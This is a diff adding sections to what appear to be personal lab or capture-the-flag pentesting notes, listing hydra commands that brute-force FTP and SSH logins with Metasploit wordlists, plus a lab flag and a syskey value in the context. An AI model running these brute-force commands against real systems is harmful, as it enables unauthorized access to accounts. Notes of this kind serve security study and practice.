@@ -312,13 +312,21 @@ syskey: 377af0de68bdc918d22c57a263d38326
 
 
 
+## Linux
 
+### Exploiting FTP
+Default attack:  Bruteforce with hydra
+Script: 
+```bash
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_user.txt -P usr/share/metasploit-framework/data/wordlists/unix_passwords.txt $ip -t 4 ftp
+```
 
+## Exploiting Ssh
+Default attack:  Bruteforce with hydra
+Script: 
+```bash
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_user.txt -P usr/share/metasploit-framework/data/wordlists/common_passwords.txt $ip -t 4 ssh
+```
 
-
-
-
-
-
-
-
+eg lab:
+flag: eb09cc6f1cd72756da145892892fbf5a
